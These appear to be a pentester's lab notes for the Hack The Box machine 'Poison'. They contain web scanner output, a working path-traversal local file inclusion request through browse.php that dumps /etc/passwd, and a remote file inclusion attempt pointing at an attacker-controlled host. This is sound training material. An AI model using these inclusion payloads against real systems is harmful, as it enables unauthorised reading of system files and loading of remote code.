![bd719b8aa1541f68af83ce591db45851.png](../../../../_resources/bd719b8aa1541f68af83ce591db45851.png)
![b2e58bb6e8665bf7ab18c8ce9b6cc25d.png](../../../../_resources/b2e58bb6e8665bf7ab18c8ce9b6cc25d.png)



## Web App Scanners

Nikto: 

```
- Nikto v2.1.6/2.1.5
+ Target Host: poison.htb
+ Target Port: 80
+ GET Retrieved x-powered-by header: PHP/5.6.32
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ HEAD Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ HEAD PHP/5.6.32 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ FAXAZHKY Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ GET /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-12184: GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3233: GET /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
```

Gobuster: 

```
/index.php            (Status: 200) [Size: 289]
/info.php             (Status: 200) [Size: 157]
/browse.php           (Status: 200) [Size: 321]
/phpinfo.php          (Status: 200) [Size: 68146]
```

Feroxbuster:
```
200      GET       12l       30w      289c http://poison.htb/
200      GET        1l       15w      157c http://poison.htb/info.php
200      GET       12l       30w      289c http://poison.htb/index.php
200      GET        4l       30w      321c http://poison.htb/browse.php
200      GET      983l     1883w        0c http://poison.htb/ini.php
200      GET      715l     4157w        0c http://poison.htb/phpinfo.php
```


## Testing for LFI: 

*`include()` function used on browse.php*
![1b3be42ef45bb7244cc5006315e9033d.png](../../../../_resources/1b3be42ef45bb7244cc5006315e9033d.png)

```
$ curl "http://poison.htb/browse.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
```



## Testing for RFI: 

```
$ curl "http://poison.htb/browse.php?file=http://10.10.14.91:9999/rfi-test.txt"      
<br />
<b>Warning</b>:  include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in <b>/usr/local/www/apache24/data/browse.php</b> on line <b>2</b><br />
<br />
<b>Warning</b>:  include(http://10.10.14.91:9999/rfi-test.txt): failed to open stream: no suitable wrapper could be found in <b>/usr/local/www/apache24/data/browse.php</b> on line <b>2</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'http://10.10.14.91:9999/rfi-test.txt' for inclusion (include_path='.:/usr/local/www/apache24/data') in <b>/usr/local/www/apache24/data/browse.php</b> on line <b>2</b><br />
```